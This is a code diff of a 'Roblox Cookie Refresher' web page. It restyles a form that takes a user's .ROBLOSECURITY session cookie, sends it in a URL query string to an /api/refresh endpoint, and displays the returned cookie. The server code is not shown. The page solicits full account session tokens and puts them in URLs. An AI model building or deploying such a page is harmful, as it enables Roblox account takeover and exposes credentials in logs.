@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enter Roblox Cookie</title>
+    <title>Roblox Cookie Refresher</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -19,10 +19,16 @@
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            color: #333;
         }
         input[type="text"] {
             padding: 10px;
-            width: 300px;
+            width: 100%;
             margin-bottom: 10px;
             border: 1px solid #ccc;
             border-radius: 4px;
@@ -39,15 +45,25 @@
         button:hover {
             background-color: #45a049;
         }
+        p {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+        }
+        #responseMessage {
+            margin-top: 10px;
+            color: #ff0000;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Enter Roblox Cookie</h1>
+        <h1>Roblox Cookie Refresher</h1>
         <form id="cookieForm">
             <label for="cookie">Enter .ROBLOSECURITY Cookie:</label><br>
             <input type="text" id="cookie" name="cookie" required><br><br>
-            <button type="submit">Submit</button>
+            <button type="submit">Refresh Cookie</button>
         </form>
         <p id="responseMessage"></p>
     </div>
@@ -57,14 +73,14 @@
             event.preventDefault();
             const cookie = document.getElementById('cookie').value;
             const responseMessage = document.getElementById('responseMessage');
-            
+
             try {
-                // Send the cookie to your API
+                // Send the cookie to your refresh API
                 const response = await fetch(`/api/refresh?cookie=${cookie}`);
                 const data = await response.json();
 
                 if (response.ok) {
-                    responseMessage.textContent = 'Cookie processed successfully!';
+                    responseMessage.textContent = `Cookie refreshed successfully! New cookie: ${data.refreshedCookie || 'No refreshed cookie returned'}`;
                 } else {
                     responseMessage.textContent = `Error: ${data.error || 'Something went wrong'}`;
                 }
